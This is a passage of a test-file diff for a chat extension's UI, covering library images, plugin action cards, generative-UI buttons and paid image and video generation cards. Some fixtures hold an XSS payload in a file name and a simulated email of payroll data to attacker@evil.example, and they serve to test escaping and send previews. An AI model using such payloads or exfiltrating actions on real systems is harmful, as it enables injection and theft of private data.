@@ -1077,7 +1077,8 @@ test("pictures from the web: a strip above the answer as it streams, each with i
     const strip = s.page.locator(".cd-assistant .cd-pictures");
     assert.equal(await strip.getAttribute("aria-label"), "Images from the web for “Hagia Sophia interior”");
     assert.deepEqual(await strip.locator(".cd-picture-site").allTextContents(), ["site0.example", "site1.example", "site2.example", "site3.example"]);
-    assert.equal(await s.page.locator(".cd-assistant > .cd-pictures + .cd-body").count(), 1, "above the answer");
+    // In its fold (0.51: a reply's pictures fold away under one header row), still above the answer.
+    assert.equal(await s.page.locator(".cd-assistant > .pic-fold:has(> .pic-fold-body > .cd-pictures) + .cd-body").count(), 1, "above the answer");
     assert.deepEqual((await s.posted("image")).map((m) => m.id), [att("a"), att("b"), att("c"), att("d")], "each asked for once, by id");
     const png = await s.page.evaluate(() => { const c = document.createElement("canvas"); c.width = 160; c.height = 120;
       c.getContext("2d").fillRect(0, 0, 160, 120); return c.toDataURL("image/png"); });
@@ -1373,6 +1374,88 @@ test("the Library: every file you attached, by kind, searched by name, each with
   } finally { await page.close(); }
 });
 
+test("the Library's Images show Work's images beside ChatDGC's, newest first, and Made in Work shows only them", async (t) => {
+  if (skipOrFail(t)) return;
+  const { html, js } = libraryHtml();
+  const page = await browser.newPage({ viewport: { width: 900, height: 700 } });
+  const errors = [];
+  page.on("pageerror", (error) => errors.push(String(error)));
+  try {
+    await page.setContent(html, { waitUntil: "load" });
+    await page.addStyleTag({ content: `:root { --vscode-font-family: system-ui, sans-serif; ${THEMES["dark-modern"]} }` });
+    await page.evaluate((code) => {
+      window.__posted = []; window.__state = undefined;
+      window.acquireVsCodeApi = () => ({ postMessage: (m) => window.__posted.push(m), getState: () => window.__state, setState(s) { window.__state = s; } });
+      eval(code);
+    }, js);
+    const send = (d) => page.evaluate((x) => window.dispatchEvent(new MessageEvent("message", { data: x })), d);
+    const posted = (type) => page.evaluate((t) => window.__posted.filter((m) => m.type === t), type);
+    const hour = (h) => new Date(Date.now() - h * 3600000).toISOString();
+    const chatImage = { source: "chat", chat_id: `chat_${"a".repeat(32)}`, id: `att_${"1".repeat(32)}`, name: "sign.png", kind: "image", type: "image",
+                        size: 7000, created_at: hour(1), chat_title: "Sign", made: true };
+    const pdf = { source: "chat", chat_id: `chat_${"b".repeat(32)}`, id: `att_${"2".repeat(32)}`, name: "visa.pdf", kind: "document", type: "pdf", size: 52000, created_at: hour(3), chat_title: "Visa" };
+    await send({ type: "library", files: [chatImage, pdf], total: 2, next: null, counts: { image: 1, pdf: 1 }, origins: { made: 1, uploaded: 1 } });
+    assert.deepEqual(await posted("workImages"), [], "not before the backend says it lists them");
+    await send({ type: "workImagesOffered", on: true });
+    const ask = (await posted("workImages")).at(-1);
+    assert.deepEqual({ ...ask, seq: undefined }, { type: "workImages", query: "", offset: 0, limit: 60, seq: undefined });
+    const fox = { path: '/home/me/app/assets/generated/fox <img src=x onerror="window.__owned=1">.png', rel: 'assets/generated/fox <img src=x onerror="window.__owned=1">.png', prompt: "a red fox in snow",
+                  generator_name: "ComfyUI on gpu-box", project: "/home/me/app", created_at: hour(0.5), width: 768, height: 320, bytes: 46000 };
+    const owl = { ...fox, path: "/home/me/app/assets/generated/owl.png", rel: "assets/generated/owl.png", prompt: "an owl", created_at: hour(2) };
+    await send({ type: "workImages", seq: ask.seq, offset: 0, images: [fox, owl], total: 2, next: null });
+    assert.match(await page.locator("#lib-about").textContent(), /and every image DGC made in Work/);
+    assert.deepEqual(await page.locator("#lib-kinds .lib-kind").allInnerTexts(), ["All\n4", "Images\n3", "PDFs\n1"], "Work's images count among the Images");
+    assert.deepEqual(await page.locator("#lib-origins .lib-kind").allInnerTexts(), ["All\n4", "Uploaded\n1", "Made by ChatDGC\n1", "Made in Work\n2"]);
+    assert.deepEqual(await page.locator(".lib-name").allTextContents(), ['fox <img src=x onerror="window.__owned=1">.png', "sign.png", "owl.png", "visa.pdf"], "newest first");
+    assert.equal(await page.evaluate(() => document.querySelectorAll(".lib-name img").length + (window.__owned || 0)), 0, "names are words");
+    const meta = await page.locator(".lib-work .lib-meta").first().textContent();
+    assert.equal(meta, "Image · 768×320 · 45 KB · made in Work · app · ComfyUI on gpu-box · Today");
+    assert.equal(await page.locator(".lib-work .lib-name").first().getAttribute("title"), "a red fox in snow", "its prompt one hover away");
+    assert.deepEqual((await posted("workImage")).map((m) => m.path), [fox.path, owl.path], "each preview asked for by its path");
+    await send({ type: "workImageData", path: fox.path, data: "data:image/png;base64,iVBORw0KGgo=" });
+    assert.equal(await page.locator(".lib-work img").first().getAttribute("src"), "data:image/png;base64,iVBORw0KGgo=");
+    for (const label of ["Open the image", "Show it in its folder", "Save a copy…"]) await page.locator(".lib-work").first().locator(`button[aria-label="${label}"]`).click();
+    assert.deepEqual((await page.evaluate(() => window.__posted.filter((m) => /^workImage(Open|Reveal|Save)$/.test(m.type)))).map((m) => [m.type, m.path]),
+      [["workImageOpen", fox.path], ["workImageReveal", fox.path], ["workImageSave", fox.path]]);
+    if (process.env.DGC_SHOTS) await page.screenshot({ path: join(process.env.DGC_SHOTS, "chatdgc-library-work-images.png") });
+    // PDFs: no Work image among them, but still counted under Images.
+    await page.locator("#lib-kinds .lib-kind", { hasText: "PDFs" }).click();
+    const counting = (await posted("workImages")).at(-1);
+    assert.equal(counting.limit, 1, "on another kind, only how many there are");
+    await send({ type: "library", files: [pdf], total: 1, next: null, counts: { image: 1, pdf: 1 }, origins: { made: 1, uploaded: 1 } });
+    await send({ type: "workImages", seq: counting.seq, offset: 0, images: [fox], total: 2, next: 1 });
+    assert.deepEqual(await page.locator(".lib-name").allTextContents(), ["visa.pdf"]);
+    assert.equal(await page.locator("#lib-more").isHidden(), true, "no more of Work's to show on PDFs");
+    // Made in Work: only Work's images.
+    await page.locator("#lib-kinds .lib-kind", { hasText: "All" }).click();
+    await page.locator("#lib-origins .lib-kind", { hasText: "Made in Work" }).click();
+    const list = (await posted("list")).at(-1);
+    assert.equal(list.origin, undefined, "ChatDGC is asked for its counts only");
+    const own = (await posted("workImages")).at(-1);
+    await send({ type: "library", files: [chatImage, pdf], total: 2, next: null, counts: { image: 1, pdf: 1 }, origins: { made: 1, uploaded: 1 } });
+    await send({ type: "workImages", seq: own.seq, offset: 0, images: [fox, owl], total: 3, next: 2 });
+    assert.deepEqual(await page.locator(".lib-name").allTextContents(), ['fox <img src=x onerror="window.__owned=1">.png', "owl.png"]);
+    assert.deepEqual(await page.locator("#lib-kinds .lib-kind").allInnerTexts(), ["All\n3", "Images\n3"]);
+    await page.locator("#lib-more").click();
+    const next = (await posted("workImages")).at(-1);
+    assert.equal(next.offset, 2, "the next page of Work's images");
+    // A search answered after a newer one is dropped.
+    await send({ type: "workImages", seq: own.seq, offset: 0, images: [], total: 0, next: null });
+    assert.equal(await page.locator(".lib-row").count(), 2);
+    // Only Work has made images: no Uploaded or Made by ChatDGC filter to offer.
+    await page.locator("#lib-origins .lib-kind", { hasText: "All" }).click();
+    const all = (await posted("workImages")).at(-1);
+    await send({ type: "library", files: [], total: 0, next: null, counts: {}, origins: { made: 0, uploaded: 0 } });
+    await send({ type: "workImages", seq: all.seq, offset: 0, images: [fox], total: 1, next: null });
+    assert.deepEqual(await page.locator("#lib-origins .lib-kind").allInnerTexts(), ["All\n1", "Made in Work\n1"]);
+    // A backend that stops listing them: Made in Work goes, and the Library is as it was.
+    await send({ type: "workImagesOffered", on: false });
+    assert.equal(await page.evaluate(() => [...document.querySelectorAll("#lib-origins .lib-kind")].some((c) => /Made in Work/.test(c.textContent))), false);
+    assert.equal(await page.locator(".lib-work").count(), 0);
+    assert.deepEqual(errors, []);
+  } finally { await page.close(); }
+});
+
 test("the Library's widgets: a tab of their own once the backend keeps them, each to open beside you, see its chat, or delete", async (t) => {
   if (skipOrFail(t)) return;
   const { html, js } = libraryHtml();
@@ -1458,7 +1541,8 @@ test("plugins in chat: a card for each change, Send it now as edited, Hand it to
     assert.equal(await card("3").locator("small").textContent(), "supply · Aave can move money, so it always asks.");
     assert.equal(await card("4").locator(".cd-card-status").textContent(), "Done. Sent with your changes.");
     assert.match(await card("4").locator(".cd-card-inputs").textContent(), /Fri 13:30/, "what was sent, as edited");
-    assert.equal(await card("4").locator("summary").textContent(), "What Google Calendar answered");
+    assert.equal(await card("4").locator(".cd-card-answer > summary").textContent(), "What Google Calendar answered");
+    assert.match(await card("4").locator(".cd-card-sent pre").textContent(), /Fri 13:30/, "and in full, one click away");
     assert.equal(await card("5").locator(".cd-card-status").textContent(), "Didn't go: Google Calendar said: calendar is read-only");
     assert.equal(await card("6").locator(".cd-card-status").textContent(), "Handed to Ava: it takes it from here.");
     assert.equal(await card("7").locator(".cd-card-status").textContent(), "Not sent.");
@@ -1511,38 +1595,108 @@ test("plugins in chat: a card for each change, Send it now as edited, Hand it to
   } finally { await s.page.close(); }
 });
 
-test("Composio batch card names inner actions without plumbing and wears Composio's logo in both themes", async (t) => {
+test("a Composio card wears Composio's logo and says each app call in plain words; the letter only without a logo", async (t) => {
   if (skipOrFail(t)) return;
   for (const theme of ["dark-modern", "light-modern"]) {
     const s = await openScreen({ theme });
     try {
-      const args = { session_id: "s1", sync_response_to_workbench: false, current_step: "EXECUTE",
-        tools: [{ tool_slug: "GMAIL_SEND_EMAIL", account: "ca_test", arguments: { to: "a@example.com", subject: "Hello" } }] };
-      const card = { id: "act_" + "a".repeat(32), plugin: "composio", plugin_name: "Composio",
-        tool: "COMPOSIO_MULTI_EXECUTE_TOOL", arguments: args, status: "waiting", at: 0 };
-      await s.send({ type: "opened", conversation: conversation({ title: "Gmail" }), earlier: 0, busy: false,
-        messages: [{ id: M(1), role: "user", text: "Send the note" },
-          { id: M(2), role: "assistant", text: "Please review.", finish: "stop", actions: [card] }] });
+      const A = (c) => "act_" + c.repeat(32);
+      const args = { tools: [{ tool_slug: "GMAIL_FETCH_EMAILS", arguments: { max_results: 5, label_ids: ["INBOX"] } },
+                             { tool_slug: "GMAIL_SEND_EMAIL", arguments: { recipient_email: "ana@example.com", subject: "Lunch", body: "Hi" } }],
+                     thought: "Fetch then reply", sync_response_to_workbench: false, session_id: "sess_1", current_step: "FETCH" };
+      const base = { plugin: "composio", plugin_name: "Composio", money: false, server: "composio", tool: "COMPOSIO_MULTI_EXECUTE_TOOL",
+                     arguments: args, recurring: false, status: "waiting", at: 0 };
+      // Thirteen app calls, the last an email with its body: the card covers them all.
+      const many = { tools: [...Array.from({ length: 12 }, (_, i) => ({ tool_slug: "GMAIL_FETCH_EMAILS", arguments: { query: `mailbox-${i + 1}` } })),
+                             { tool_slug: "GMAIL_SEND_EMAIL", arguments: { recipient_email: "ana@example.com", subject: "Lunch", body: "See you at noon by the river" } }],
+                     session_id: "sess_2" };
+      await s.send({ type: "opened", conversation: conversation({ title: "Mail" }), earlier: 0, busy: false, messages: [
+        { id: M(1), role: "user", text: "Mail" }, { id: M(2), role: "assistant", text: "Here.", finish: "stop",
+          actions: [{ ...base, id: A("1") }, { ...base, id: A("2"), plugin: "gcal", plugin_name: "Google Calendar", tool: "create_event", arguments: { title: "Lunch" } },
+                    { ...base, id: A("3"), arguments: many }] }] });
       await s.frame();
-      const box = s.page.locator(".cd-card");
-      assert.match(await box.textContent(), /Gmail · Send email · through Composio/);
-      assert.doesNotMatch(await box.textContent(), /session_id|sync_response_to_workbench|current_step|ca_test/);
-      assert.deepEqual((await s.posted("pluginLogos")).map(m => m.plugins), [["composio"]]);
-      const svg = readFileSync(join(root, "media/plugin-logos/composio.svg")).toString("base64");
-      await s.send({ type: "pluginLogos", logos: { composio: `data:image/svg+xml;base64,${svg}` } });
+      const card = (c) => s.page.locator(`.cd-card[data-action="${A(c)}"]`);
+      assert.deepEqual((await s.posted("pluginLogos")).flatMap((m) => m.plugins).sort(), ["composio", "gcal"], "it asks for the plugins' logos");
+      assert.equal(await card("1").locator(".cd-card-mark").textContent(), "C", "no logo yet: its letter");
+      const logo = "data:image/svg+xml;base64," + Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10" fill="#111"/></svg>').toString("base64");
+      await s.send({ type: "pluginLogos", logos: { composio: logo, gcal: "" } });
       await s.frame();
-      assert.equal(await box.locator(".cd-card-mark img").count(), 1, `${theme}: the card uses the plugin's logo`);
-      if (process.env.DGC_SHOTS) await box.screenshot({ path: join(process.env.DGC_SHOTS, `chatdgc-composio-card-${theme}.png`) });
-      await box.getByRole("button", { name: "Edit" }).click();
+      assert.equal(await card("1").locator(".cd-card-mark img").getAttribute("src"), logo, "Composio's own logo, never Gmail's");
+      assert.equal(await card("2").locator(".cd-card-mark").textContent(), "G", "a plugin with no logo keeps its letter");
+      assert.equal(await card("1").locator("strong").textContent(), "Do this in Composio?");
+      assert.deepEqual(await card("1").locator(".cd-card-calls .cd-call-line").allTextContents(),
+                       ["Gmail · Fetch emails · 5 from Inbox · through Composio", "Gmail · Send email · to ana@example.com · “Lunch” · through Composio"]);
+      // A call that sends shows what it sends under its line, with no click; a read keeps its inputs one click away.
+      assert.deepEqual(await card("1").locator(".cd-card-calls li").nth(1).locator(".cd-card-inputs").innerText(),
+                       "recipient_email\nana@example.com\nsubject\nLunch\nbody\nHi");
+      assert.equal(await card("1").locator(".cd-card-calls li").first().locator(".cd-card-inputs").count(), 0);
+      const text = await card("1").textContent();
+      for (const plumbing of ["session_id", "sess_1", "sync_response_to_workbench", "thought", "current_step"]) {
+        assert.equal(text.includes(plumbing), false, `no ${plumbing} on the card`);
+      }
+      assert.equal((await card("1").innerText()).includes("{"), false, "no raw JSON in sight");
+      // Every action it covers, what the email sends in sight, and all of it as sent one click away, without Edit.
+      assert.equal(await card("3").locator(".cd-card-calls li").count(), 13);
+      assert.equal(await card("3").getByText("See you at noon by the river", { exact: true }).isVisible(), true, "the email's body, with no click");
+      assert.equal(await card("3").locator(".cd-card-sent > summary").textContent(), "Inputs as sent");
+      assert.equal(await card("3").locator(".cd-card-sent").getAttribute("open"), null, "closed until clicked");
+      assert.match(await card("3").locator(".cd-card-sent pre").textContent(), /See you at noon by the river/);
+      assert.equal((await card("3").textContent()).includes("sess_2"), false, "no plumbing");
+      await card("3").locator(".cd-card-sent > summary").click();
+      assert.equal(await card("3").locator(".cd-card-sent pre").isVisible(), true, "one click shows it");
+      // Any other plugin's card: its inputs in short, and in full one click away.
+      assert.match(await card("2").locator(".cd-card-sent pre").textContent(), /"title": "Lunch"/);
+      // Edit still edits the real inputs, plumbing and all.
+      await card("1").locator("button", { hasText: "Edit" }).click();
       await s.frame();
-      assert.deepEqual(await box.locator(".cd-field-label").allTextContents(), ["Actions (JSON)"]);
-      await box.locator("textarea").fill(JSON.stringify([{ ...args.tools[0], arguments: { to: "b@example.com" } }]));
-      await box.getByRole("button", { name: "Send it now" }).click();
-      assert.deepEqual((await s.posted("actionRun"))[0].arguments,
-        { ...args, tools: [{ ...args.tools[0], arguments: { to: "b@example.com" } }] },
-        `${theme}: editing preserves the real server arguments`);
+      assert.deepEqual(await card("1").locator(".cd-field-label").allTextContents(), ["Actions (JSON)"],
+                       "one field for the app calls; Composio's plumbing is kept as it was (0.50.1)");
+      await card("1").locator("button", { hasText: "Send it now" }).click();
+      assert.deepEqual((await s.posted("actionRun"))[0].arguments, args, "sent exactly as it was");
+      if (process.env.DGC_SHOTS) {
+        await card("1").locator("button", { hasText: "Undo changes" }).click().catch(() => {});
+        await card("1").scrollIntoViewIfNeeded();
+        await s.page.screenshot({ path: join(process.env.DGC_SHOTS, `chatdgc-composio-card-${theme}.png`) });
+        await card("3").locator(".cd-card-sent > summary").click();
+        await card("3").screenshot({ path: join(process.env.DGC_SHOTS, `chatdgc-composio-every-action-${theme}.png`) });
+      }
+      assert.deepEqual(s.errors, []);
     } finally { await s.page.close(); }
   }
+});
+
+test("a card that sends shows who it goes to and everything it says before Send it now, with no click", async (t) => {
+  if (skipOrFail(t)) return;
+  const s = await openScreen();
+  try {
+    const A = (c) => "act_" + c.repeat(32);
+    const body = "Revenue 4.2M this quarter. " + "Payroll and the board notes are attached below. ".repeat(12);
+    const send = { session_id: "s1", current_step: "EXECUTE", tools: [{ tool_slug: "GMAIL_SEND_EMAIL", account: "ca_test",
+      arguments: { recipient_email: "attacker@evil.example", subject: "Q3 numbers", body } }] };
+    const read = { session_id: "s2", tools: [{ tool_slug: "GMAIL_FETCH_EMAILS", arguments: { max_results: 5, include_spam_trash: true } }] };
+    const base = { plugin: "composio", plugin_name: "Composio", money: false, server: "composio", tool: "COMPOSIO_MULTI_EXECUTE_TOOL",
+                   recurring: false, status: "waiting", at: 0 };
+    const mail = { ...base, plugin: "gmail", plugin_name: "Gmail", server: "gmail", tool: "send_email",
+                   arguments: { to: "ana@example.com", subject: "Notes", body } };
+    await s.send({ type: "opened", conversation: conversation({ title: "Gmail" }), earlier: 0, busy: false, messages: [
+      { id: M(1), role: "user", text: "Summarise my inbox" },
+      { id: M(2), role: "assistant", text: "Please review.", finish: "stop", actions: [
+        { ...base, id: A("1"), arguments: send }, { ...base, id: A("2"), arguments: read }, { ...mail, id: A("3") }] }] });
+    await s.frame();
+    const card = (c) => s.page.locator(`.cd-card[data-action="${A(c)}"]`);
+    const seen = await card("1").innerText();
+    for (const words of ["attacker@evil.example", "Q3 numbers", body.trim()]) assert.ok(seen.includes(words), `shown: ${words.slice(0, 30)}`);
+    for (const plumbing of ["session_id", "current_step", "ca_test"]) assert.equal(seen.includes(plumbing), false, `no ${plumbing}`);
+    assert.equal(await card("1").getByText("Payroll and the board notes", { exact: false }).first().isVisible(), true);
+    assert.ok(await card("1").locator("button", { hasText: "Send it now" }).isEnabled());
+    // A read keeps its inputs one click away.
+    assert.equal(await card("2").locator(".cd-card-inputs").count(), 0);
+    assert.equal((await card("2").innerText()).includes("include_spam_trash"), false);
+    assert.match(await card("2").locator(".cd-card-sent pre").textContent(), /include_spam_trash/);
+    // Any other plugin's card that sends: each input in full, a long body too, not cut at 400 characters.
+    assert.equal((await card("3").locator(".cd-card-inputs").innerText()).includes(body.trim()), true);
+    assert.deepEqual(s.errors, []);
+  } finally { await s.page.close(); }
 });
 
 test("follow-ups: a few next messages under the last reply; one click sends it, and the box keeps what you were typing", async (t) => {
@@ -1567,7 +1721,9 @@ test("follow-ups: a few next messages under the last reply; one click sends it, 
     const sent = (await s.posted("send")).at(-1);
     assert.deepEqual([sent.text, typeof sent.model, sent.search], [next[0], "string", "auto"]);
     assert.equal(await s.page.locator("#cd-input").inputValue(), "half-typed thought", "the box keeps what you were typing");
-    await box.locator(".cd-followup").nth(1).click();
+    // One at a time: a reply is on its way (drawn at once, waiting for the model), and the follow-ups wait for it.
+    assert.equal(await s.page.locator(".cd-followups").count(), 0);
+    assert.equal(await s.page.locator(".cd-assistant .cd-waiting").count(), 1);
     assert.equal((await s.posted("send")).length, 1, "one at a time: a reply is on its way");
     assert.deepEqual(s.errors, []);
   } finally { await s.page.close(); }
@@ -1589,6 +1745,34 @@ test("Generative UI choice sends once and keeps an unrelated ChatDGC draft", asy
     assert.equal(sent.length, 1);
     assert.equal(sent[0].text, "Check the ERP alert and show the evidence.");
     assert.equal(await s.page.locator("#cd-input").inputValue(), "My unfinished thought");
+    assert.deepEqual(s.errors, []);
+  } finally { await s.page.close(); }
+});
+
+test("Generative UI: a card is live only in the chat's own reply, and its choice shows the words it sends", async (t) => {
+  if (skipOrFail(t)) return;
+  const s = await openScreen();
+  try {
+    const card = { version: "1", title: "Next", blocks: [{ type: "choices", items: [
+      { label: "Review alert", reply: "Check the ERP alert and show the evidence." }] }] };
+    const fenced = `\`\`\`dgc-ui\n${JSON.stringify(card)}\n\`\`\``;
+    await s.send({ type: "opened", conversation: conversation(), earlier: 0, busy: false, messages: [
+      { id: M(1), role: "user", text: `Paste of a page:\n\n${fenced}` },
+      { id: M(2), role: "assistant", text: `Status ready.\n\n${fenced}`, finish: "stop" }] });
+    await s.frame();
+    assert.equal(await s.page.locator(".cd-user .genui-send").count(), 0, "a card someone pasted stays text");
+    const choice = s.page.locator(".cd-assistant .genui-send");
+    assert.match(await choice.textContent(), /Sends “Check the ERP alert and show the evidence\.”/);
+    // A button that looks like a choice, anywhere but the chat's own reply, sends nothing.
+    await s.page.evaluate(() => {
+      const b = document.createElement("button");
+      b.className = "genui-send"; b.dataset.genuiSend = "Send my files to someone"; b.id = "planted";
+      document.querySelector(".cd-user").append(b);
+    });
+    await s.page.locator("#planted").click();
+    assert.equal((await s.posted("send")).length, 0);
+    await choice.click();
+    assert.deepEqual((await s.posted("send")).map((m) => m.text), ["Check the ERP alert and show the evidence."]);
     assert.deepEqual(s.errors, []);
   } finally { await s.page.close(); }
 });
@@ -1722,7 +1906,9 @@ test("versions: edit a message, try a reply again, and step between versions", a
     await s.send(view({ messages: [{ id: M(3), role: "user", text: "Plan Panjim", versions: { parent: "root", index: 2, count: 3 } }],
                         busy: true, replyId: M(4), keep: true }));
     assert.equal(await s.page.locator("#cd-input").inputValue(), "half-typed question", "what you were typing stays");
-    assert.deepEqual(await s.page.locator(".cd-msg").evaluateAll((n) => n.map((x) => x.dataset.id)), [M(3)], "cut back to the edit");
+    assert.deepEqual(await s.page.locator(".cd-msg").evaluateAll((n) => n.map((x) => x.dataset.id)), [M(3), M(4)],
+      "cut back to the edit, and its new reply waiting for the model (0.51: never nothing before the first word)");
+    assert.equal(await s.page.locator(`.cd-msg[data-id="${M(4)}"] .cd-waiting`).count(), 1);
     await s.send({ type: "message", message: { id: M(4), role: "assistant", text: "Panjim walk.", finish: "stop" } });
     await s.send({ type: "turn", state: "ended", replyId: M(4) });
     await s.frame();
@@ -3669,6 +3855,367 @@ test("Open here for a chat: while it's read-only nothing that would change it lo
     }
     await s.page.locator("#cd-input").fill("Faster");
     assert.equal(await s.page.locator("#cd-send").isDisabled(), false);
+    assert.deepEqual(s.errors, []);
+  } finally { await s.page.close(); }
+});
+
+test("an image a reply made shows as its picture, and a paid generator's card says its price and Make it", async (t) => {
+  if (skipOrFail(t)) return;
+  const s = await openScreen();
+  try {
+    const picture = `att_${"b".repeat(32)}`;
+    const png = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGNgYGAAAAAEAAH2FzhVAAAAAElFTkSuQmCC";
+    await s.send({ type: "opened", conversation: conversation({ title: "Foxes" }), busy: false, earlier: 0, messages: [
+      { id: M(1), role: "user", text: "Draw a fox, then a logo" },
+      { id: M(2), role: "assistant", text: "Here's your fox.",
+        files: [{ id: picture, kind: "image", name: "a-red-fox.png", format: "png", mime: "image/png", size: 245081, made: true }],
+        actions: [{ id: `act_${"c".repeat(32)}`, kind: "image", plugin: "images", plugin_name: "fal FLUX schnell", tool: "generate_image",
+                    money: false, status: "waiting", price: "about $0.003", recurring: false,
+                    arguments: { prompt: "a minimal fox logo", size: "1024x1024", count: 1, generator: "fal" } }] },
+    ] });
+    assert.deepEqual((await s.posted("image")).map((m) => m.id), [picture], "the picture is asked for, as an attached one is");
+    await s.send({ type: "image", id: picture, data: png });
+    await s.frame();
+    assert.equal(await s.page.locator(`.cd-file-image img[data-att="${picture}"]`).getAttribute("src"), png);
+    assert.equal(await s.page.locator(".cd-file-image .cd-file-badge").textContent(), "PNG");
+    // It's in DGC's own folder: Save to project… puts a copy in the open project (assets/ unless you pick).
+    assert.deepEqual(await s.page.locator(".cd-file-image .cd-file-actions button").allTextContents(), ["Open", "Save a copy…", "Save to project…"]);
+    await s.page.locator(".cd-file-project").click();
+    assert.deepEqual(await s.posted("fileSave"), [{ type: "fileSave", messageId: M(2), fileId: picture, name: "a-red-fox.png", project: true }]);
+    // The picture's frame is the picture: the row-wide button around it draws nothing, so no grey band beside it.
+    const frame = await s.page.locator(".cd-file-image > .cd-thumb").evaluate((b) => {
+      const box = getComputedStyle(b), pic = getComputedStyle(b.querySelector("img"));
+      return { ground: box.backgroundColor, edge: box.borderTopWidth, picEdge: pic.borderTopWidth };
+    });
+    assert.deepEqual(frame, { ground: "rgba(0, 0, 0, 0)", edge: "0px", picEdge: "1px" });
+    assert.equal(await s.page.locator(".cd-card .cd-card-words strong").textContent(), "Make this image with fal FLUX schnell?");
+    assert.match(await s.page.locator(".cd-card .cd-card-words small").textContent(), /1 × 1024x1024 · about \$0\.003 · nothing is made until you send it/);
+    const buttons = await s.page.locator(".cd-card .cd-card-actions button").allTextContents();
+    assert.deepEqual(buttons, ["Make it · about $0.003", "Edit", "Don't"], "an image isn't handed to a Pip");
+    await s.page.locator(".cd-card .cd-card-actions button", { hasText: "Make it" }).click();
+    assert.equal((await s.posted("actionRun")).length, 1);
+    assert.deepEqual(s.errors, []);
+  } finally { await s.page.close(); }
+});
+
+test("a paid image card says what its money needs said: this month's limit passed (0.51)", async (t) => {
+  if (skipOrFail(t)) return;
+  const s = await openScreen();
+  try {
+    const note = "This would pass this month's limit for this generator, so DGC asks.";
+    await s.send({ type: "opened", conversation: conversation({ title: "Logo" }), busy: false, earlier: 0, messages: [
+      { id: M(1), role: "user", text: "A logo" },
+      { id: M(2), role: "assistant", text: "Here's a card.",
+        actions: [{ id: `act_${"e".repeat(32)}`, kind: "image", plugin: "images", plugin_name: "fal FLUX schnell", tool: "generate_image",
+                    money: true, status: "waiting", price: "about $0.003", recurring: false, card: { over_limit: true, note },
+                    arguments: { prompt: "a minimal fox logo", size: "1024x1024", count: 1, generator: "fal" } }] }] });
+    await s.frame();
+    assert.equal(await s.page.locator(".cd-card .cd-card-note").textContent(), note);
+    assert.deepEqual(s.errors, []);
+  } finally { await s.page.close(); }
+});
+
+test("a paid image card says this month's spend, as Work's card does, once there is any (0.51)", async (t) => {
+  // Release check, 2026-11-03: the editor's notes promise this month's spend on the picture card; ChatDGC never said it.
+  if (skipOrFail(t)) return;
+  const s = await openScreen();
+  try {
+    const action = (id, card) => ({ id, kind: "image", plugin: "images", plugin_name: "fal.ai FLUX Schnell", tool: "generate_image",
+      money: true, status: "waiting", price: "about $0.003", recurring: false, ...(card ? { card } : {}),
+      arguments: { prompt: "a single bright yellow sunflower", size: "512x512", count: 1, generator: "fal" } });
+    await s.send({ type: "opened", conversation: conversation({ title: "Sunflower" }), busy: false, earlier: 0, messages: [
+      { id: M(1), role: "user", text: "A sunflower" },
+      { id: M(2), role: "assistant", text: "Here's a card.", actions: [action(`act_${"f".repeat(32)}`, { this_month: "$0.006 so far" })] },
+      { id: M(3), role: "user", text: "And one with a limit, and one before anything was spent" },
+      { id: M(4), role: "assistant", text: "Two cards.", actions: [action(`act_${"g".repeat(32)}`, { this_month: "$0.006 of your $5.00 limit" }),
+                                                                 action(`act_${"h".repeat(32)}`, {})] }] });
+    await s.frame();
+    assert.deepEqual(await s.page.locator(".cd-card .cd-card-words small").allTextContents(), [
+      "1 × 512x512 · about $0.003 · this month $0.006 so far · nothing is made until you send it.",
+      "1 × 512x512 · about $0.003 · this month $0.006 of your $5.00 limit · nothing is made until you send it.",
+      "1 × 512x512 · about $0.003 · nothing is made until you send it."]);
+    assert.deepEqual(s.errors, []);
+  } finally { await s.page.close(); }
+});
+
+test("a video card says its length and price first, then follows its job into the player (0.51)", async (t) => {
+  if (skipOrFail(t)) return;
+  const s = await openScreen();
+  try {
+    const card = { id: `act_${"d".repeat(32)}`, kind: "video", plugin: "videos", plugin_name: "fal Wan 2.2", tool: "generate_video",
+      money: true, status: "waiting", price: "about $0.15", recurring: false,
+      card: { label: "fal Wan 2.2 5B", facts: "5 s · 720p · about $0.15", minutes: "about 1–2 min", this_month: "$0.15 so far" },
+      arguments: { prompt: "a felt ball rolls across a desk", generator: "fal-wan", duration_s: 5, resolution: "720p", aspect: "16:9" } };
+    await s.send({ type: "opened", conversation: conversation({ title: "Felt" }), busy: false, earlier: 0, messages: [
+      { id: M(1), role: "user", text: "Animate a felt ball" },
+      { id: M(2), role: "assistant", text: "Here's a card.", actions: [card] }] });
+    await s.frame();
+    assert.equal(await s.page.locator(".cd-video-card .cd-card-words strong").textContent(), "Make this video with fal Wan 2.2 5B?");
+    assert.equal(await s.page.locator(".cd-video-card .cd-card-words small").textContent(),
+      "5 s · 720p · about $0.15 · this month $0.15 so far · about 1–2 min · nothing is made until you send it.");
+    assert.deepEqual(await s.page.locator(".cd-video-card .cd-card-actions button").allTextContents(), ["Make it · about $0.15", "Edit", "Don't"]);
+    await s.page.locator(".cd-video-card button", { hasText: "Edit" }).click();
+    await s.page.locator(".cd-video-card textarea").fill("a blue felt ball rolls");
+    await s.page.locator(".cd-video-card button", { hasText: "Make it" }).click();
+    const [run] = await s.posted("actionRun");
+    assert.equal(run.arguments.prompt, "a blue felt ball rolls", "Edit changes the prompt it's made with");
+    const job = "vid_" + "0123456789ab";
+    await s.send({ type: "action", messageId: M(2), action: { ...card, status: "running", job,
+      job_view: { id: job, state: "queued", status: "in fal's queue", label: "fal Wan 2.2 5B", started: Date.now() / 1000, can_stop: true } } });
+    await s.frame();
+    assert.match(await s.page.locator(".cd-video-card .video-words").textContent(), /^fal Wan 2\.2 5B: in fal's queue · 0:0\d$/);
+    await s.page.locator(".cd-video-card .video-stop").click();
+    assert.equal((await s.posted("videoStop"))[0].job, job, "Stop goes to the host");
+    await s.send({ type: "action", messageId: M(2), action: { ...card, status: "done", job,
+      job_view: { id: job, state: "done", label: "fal Wan 2.2 5B", resolution: "720p", cost_usd: 0.15 },
+      video: { path: "/home/me/.dgc/videos/chats/chat_a/a-felt-ball.mp4", file: "a-felt-ball.mp4", seconds: 5, width: 1280, height: 720, bytes: 2100000 } } });
+    await s.frame();
+    assert.equal(await s.page.locator(".cd-video-card video").count(), 1, "the card is its player now");
+    assert.equal((await s.posted("videoData"))[0].path, "/home/me/.dgc/videos/chats/chat_a/a-felt-ball.mp4");
